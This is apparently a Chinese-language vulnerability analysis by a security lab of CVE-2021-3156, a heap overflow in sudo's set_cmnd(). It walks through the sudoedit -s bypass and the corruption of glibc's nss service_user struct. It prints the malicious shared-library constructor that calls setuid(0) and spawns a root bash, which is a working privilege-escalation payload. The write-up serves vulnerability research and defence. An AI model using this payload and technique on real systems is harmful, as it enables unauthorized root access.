作者：中兴沉烽实验室_流光奕然

## 0x01 漏洞背景

sudo程序存在一个高危安全漏洞，漏洞编号为 **CVE-2021-3156** ，非root用户可通过执行“sudoedit
-s”和以单个`'\'`结尾的命令行参数利用漏洞，获取root权限。

该漏洞NVD的打分为 **CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H** ，最终得分为 **7.8** 分。

漏洞影响范围为：

 **sudo 1.8.2-1.8.31p2**

 **sudo 1.9.0-1.9.5p1**

## 0x02 漏洞成因及利用说明

sudo **sudoers.c**
源文件中的`set_cmnd()`函数在拷贝参数时，由于错误处理'\'，造成堆写越界的问题，攻击者可通过控制参数和环境变量向特定堆地址之后的内存中写入任意长度的数据，其中包括'\0'。

该漏洞存在多种利用方式，常见利用方式包括：

>
> 1、通过堆溢出覆盖`process_hooks_getenv`中`sudo_hook_entry`结构体的函数指针，进而通过execve()`函数执行代码得到root权限。
>
>
> 2、通过堆溢出覆盖glibc`nss_load_library()`函数`ni`结构体，进而通过`__libc_dlopen()`加载恶意动态库，执行代码得到root权限。

由于不同版本的环境上执行时，堆内存分布不同，发生溢出的缓冲区大小、溢出长度、环境变量等参数需要模糊测试或暴力破解等方式得到，本文分析的是第二种利用方式。

## 0x03 漏洞调试分析

使用 **execve() **函数执行系统中的** /usr/bin/sudoedit**，并将payload通过参数变量`char
*sudo_argv[]`和环境变量`char
*sudo_envp[]`进行传递。（这里使用`execve()`的目的是为了便于控制执行时的env环境变量。）

    
    
    execve("/usr/bin/sudoedit", sudoargv, sudoenvp);
    

`char *sudo_argv[]`和`char *sudo_envp[]`值分别如下。

![image-20210204163752199.png](https://image.3001.net/images/20210204/1612436055_601bd2576b95cd51159e2.png!small)

![image-20210204163728382.png](https://image.3001.net/images/20210204/1612436071_601bd267d4600eecd963e.png!small)

 **sudo.c**
的`main()`函数先调用`paese_args()`解析运行状态并转义特殊字符，然后调用`set_cmnd()`函数。`set_cmnd()`函数存在堆溢出漏洞，可向堆中写入任意长的数据。

`main()`函数首先调用 **parse_args.c** 中的`parse_args()`函数。

    
    
    main(int argc, char *argv[], char *envp[])
    {
        int nargc, ok, status = 0;
        char **nargv, **env_add;
        sudo_mode = parse_args(argc, argv, &nargc, &nargv, &settings, &env_add);
    ...
    }
    

该函数处理如下。

> 1、根据用户执行命令及相关参数对`mode`及`flags`标志位进行赋值。
>
> 2、根据`mode`及`flags`标志位的值，判断是否需要对`'\'`等特殊字符进行转义。
>
> 3、对参数数量变量`int nargc`以及参数指针变量`char **nargv`进行赋值。
>
> 4、将`mode|flags`的计算结果作为返回值赋给主函数的`sudo_mode`变量。

攻击者执行 **sudoedit [-s shell] file** 命令时，`parse_args()`函数会判断用户命令行输入的执行文件名`char
*progname`是否为**"sudoedit" **字符串，如果是则将`int mode`变量置为**MODE_EDIT**（该宏为 **0x02**
）。然后使用`switch()`语句判断参数是否包含**'-s' **，如果是则将`int flags`变量置为**MODE_SHELL**（该宏为
**0x20000** ）。

    
    
    #define DEFAULT_VALID_FLAGS	(MODE_BACKGROUND|MODE_PRESERVE_ENV|MODE_RESET_HOME|MODE_LOGIN_SHELL|MODE_NONINTERACTIVE|MODE_SHELL)
    
    int
    parse_args(int argc, char **argv, int *nargc, char ***nargv,
        struct sudo_settings **settingsp, char ***env_addp)
    {
        struct environment extra_env;
        int mode = 0;
        int flags = 0;
        int valid_flags = DEFAULT_VALID_FLAGS;
    ...
        if (proglen > 4 && strcmp(progname + proglen - 4, "edit") == 0) {
    	progname = "sudoedit";
    	mode = MODE_EDIT;
    	sudo_settings[ARG_SUDOEDIT].value = "true";
        }
    ...
        if ((ch = getopt_long(argc, argv, short_opts, long_opts, NULL)) != -1) {
    	    switch (ch) {
        		case 's':
    		    sudo_settings[ARG_USER_SHELL].value = "true";
    		    SET(flags, MODE_SHELL);
    		    break;
        }
    ...
    }
    

当`mode`值为`MODE_EDIT`（该宏为 **0x02** ），且`flags`为`MODE_SHELL`（该宏为 **0x20000**
）时。语句`(ISSET(mode, MODE_RUN) && ISSET(flags, MODE_SHELL))`执行结果为 **false**
，可绕过判断。否则代码在包含`'\'`在内的特殊字符前添加`'\\'`进行转义，会导致攻击失效。

最终将`*nargc`赋值为`argc`，将`*nargv `赋值为`argv`。并`mode |
flags`的计算结果返回给主函数的`sudo_mode`变量。

    
    
    #define DEFAULT_VALID_FLAGS	(MODE_BACKGROUND|MODE_PRESERVE_ENV|MODE_RESET_HOME|MODE_LOGIN_SHELL|MODE_NONINTERACTIVE|MODE_SHELL)
    
    int
    parse_args(int argc, char **argv, int *nargc, char ***nargv,
        struct sudo_settings **settingsp, char ***env_addp)
    {
        struct environment extra_env;
        int mode = 0;
        int flags = 0;
        int valid_flags = DEFAULT_VALID_FLAGS;
    ...
        if (ISSET(mode, MODE_RUN) && ISSET(flags, MODE_SHELL)) {
    	char **av, *cmnd = NULL;
    	int ac = 1;
    	if (argc != 0) {
    	    char *src, *dst;
    	    size_t cmnd_size = (size_t) (argv[argc - 1] - argv[0]) +
    		strlen(argv[argc - 1]) + 1;
    	    for (av = argv; *av != NULL; av++) {
    		for (src = *av; *src != '\0'; src++) {
    		    if (!isalnum((unsigned char)*src) && *src != '_' && *src != '-' && *src != '$')
    			*dst++ = '\\';
    		    *dst++ = *src;
    		}
    ...
    *nargc = argc;
    *nargv = argv;
    }
    

执行代码后，`mode`及`flags`打印如下。

![image-20210203123951989.png](https://image.3001.net/images/20210204/1612436309_601bd3555a00171ed4812.png!small)

函数返回值`sudo_mode`打印如下。

![image-20210203174207796.png](https://image.3001.net/images/20210204/1612436318_601bd35e871993e3c14ab.png!small)

`main()`函数进入`set_cmnd()`函数，此时调用栈如下。

![image-20210203174418154.png](https://image.3001.net/images/20210204/1612436329_601bd369731317512b9d0.png!small)

`set_cmnd()`函数会先通过`malloc`分配堆空间，用于拷贝参数。此时分配空间的`size`为 **0x74** 。

然后对`sudo_mode变量`进行判断。此时变量`sudo_mode`值为 **0x20002** ，语句`ISSET(sudo_mode,
MODE_SHELL|MODE_LOGIN_SHELL)`的执行结果为 **True** （宏`MODE_SHELL`为 **0x20000**
，宏`MODE_EDIT`为 **0x02** ），通过if判断后，程序进入溢出点。

![image-20210203162626070.png](https://image.3001.net/images/20210204/1612436350_601bd37e01fe41ae77f8e.png!small)

    
    
    static int
    set_cmnd(void)
    {
        if (user_cmnd == NULL)
    	user_cmnd = NewArgv[0];
    	if (NewArgc > 1) {
    	    char *to, *from, **av;
    	    size_t size, n;
    	    for (size = 0, av = NewArgv + 1; *av; av++)
    		size += strlen(*av) + 1;
    	    if (size == 0 || (user_args = malloc(size)) == NULL) {
    		sudo_warnx(U_("%s: %s"), __func__, U_("unable to allocate memory"));
    		debug_return_int(-1);
    	    }
    	    if (ISSET(sudo_mode, MODE_SHELL|MODE_LOGIN_SHELL)) {//通过判断后进入溢出点
    ... 
        }
    }
    

`set_cmnd()`函数执行for循环将参数字符串拷贝到堆中。执行过程中当`*from`为'\'且`*(from+1)`不为空格时，会执行`from++`语句，然后指针指向下一字节拷贝。当拷贝的参数字符串以`'\'`符号结尾时，会进入if语句Ture分支执行`from++`，指针指向下一个字节**'\0'**。当执行`*to++=*from++`语句时，会将`from`指向的字节`'\0'`拷贝到堆中。拷贝完成后`from`指针加1，指向下一个字符串的首字节接着进行拷贝，从而造成堆写越界。

    
    
    for (to = user_args, av = NewArgv + 1; (from = *av); av++) {
    		    while (*from) {
    			if (from[0] == '\\' && !isspace((unsigned char)from[1]))
    			    from++;
    			*to++ = *from++;
    		    }
    		    *to++ = ' ';
    		}
    		*--to = '\0';
    	    }
    

初始时`from`指针指向 **0x7fffffffee02** 。其中 **0x7fffffffee02** 至 **0x7fffffffee75**
为`execve()`执行时设置的`s_argv[]`参数值。

![image-20210204101518820.png](https://image.3001.net/images/20210204/1612436110_601bd28eac373a9457f60.png!small)

 **0x7fffffffee76** 至 **0x7fffffffefe5**
为`s_envp[]`环境变量值。环境变量包含`'\'`、字符串`"/SHELL_CODExx"`以及`LC_ALL=C.UTF-8@`等。设置环境变量`LC_ALL`的目的是为了影响堆chunk的分配。

    
    
    int
    main(int argc, char *argv[], char *envp[])
    {
      setlocale(LC_ALL, "");
    
    }
    

打印环境变量数据如下。

![image-20210204154714943.png](https://image.3001.net/images/20210204/1612436138_601bd2aa5c3c42cbe3610.png!small)

拷贝完成后，将覆盖 **0x555555784320** 至 **0x5555557844e6**
的堆区域。此时写数据的长度为0x1c6个字节，越界写的长度为152个字节，其部分内容如下。

![image-20210204154839530.png](https://image.3001.net/images/20210204/1612436152_601bd2b841dd8c7933085.png!small)

## 0x04 漏洞利用

通过溢出可覆盖`glibc`中的`ni`结构体指针指向的堆区域，`ni`指针指向了`service_user`类型的机构体，`service_user`结构体定义如下。

![image-20210204112514053.png](https://image.3001.net/images/20210204/1612436164_601bd2c4d030a00575dfc.png!small)

`ni`指针指向的内存区域为 **0x5555557843a0** 至 **0x5555557843df** 。写溢出后，该区域数据如下。

![image-20210204154957753.png](https://image.3001.net/images/20210204/1612436177_601bd2d143a3b4f85f8a7.png!small)

结构体`ni->library`变量(地址为 **0x5555557843c0** )被覆盖为 **0x0** ，`ni->name`变量(
**0x5555557843d0** )被覆盖为**"/SHELL_CODExx"**。

![image-20210204155031569.png](https://image.3001.net/images/20210204/1612436189_601bd2dd8a17d90948c5d.png!small)

![image-20210204155100749.png](https://image.3001.net/images/20210204/1612436198_601bd2e6bc3ffdf5e2dc7.png!small)

接下来会调用glibc库`nsswitch.c`文件中的`nss_load_library()`函数加载动态库，函数调用栈如下。

![image-20210204143739295.png](https://image.3001.net/images/20210204/1612436216_601bd2f833a43fb5ee015.png!small)

检测`ni->library`为null后，将调用`nss_new_service()`对`ni->library`进行赋值。赋值完成后，`ni->library`指向
**0x555555792970** 。

    
    
    nss_load_library (service_user *ni)
    {
    ...
      if (ni->library == NULL)
        {
          static name_database default_table;
          ni->library = nss_new_service (service_table ?: &default_table,
    				     ni->name);
        }
    ...
      return 0;
    }
    

![image-20210204155158609.png](https://image.3001.net/images/20210204/1612436229_601bd3051e2e81cd995c9.png!small)

`nss_load_library()`用`ni->name`变量拼接so动态库的名称。进行拼接后后，`shlib_name`的值为**"libnss/SHELL_CODExx
.so.2"**。  
![image.png](https://image.3001.net/images/20210204/1612437283_601bd723a392a77067ca1.png!small)![image-20210204155259142.png](https://image.3001.net/images/20210204/1612436246_601bd316dd1894dd56b33.png!small)

当调用`__libc_dlopen
(shlib_name)`加载动态库时，动态库的`_init()`函数会得到执行。通过恶意构造`_libnss_/SHELL_CODExx
.so.2`动态库，可通过加载动态库获取root权限。动态库内容如下。

    
    
    #include <unistd.h>
    #include <stdlib.h>
    #include <string.h>
    static void __attribute__ ((constructor)) _init(void);
    static void _init(void) {
    	char *initargv[] = { "bash", NULL };
    	char *initenvp[] = { "PATH=/bin:/usr/bin:/sbin", NULL };
    	setuid(0); seteuid(0); setgid(0); setegid(0);
    	execve("/bin/bash", initargv,initenvp);
    }
    

最终提权效果如下。

![image-20210204155548165.png](https://image.3001.net/images/20210204/1612436260_601bd324d6078fcc67b34.png!small)

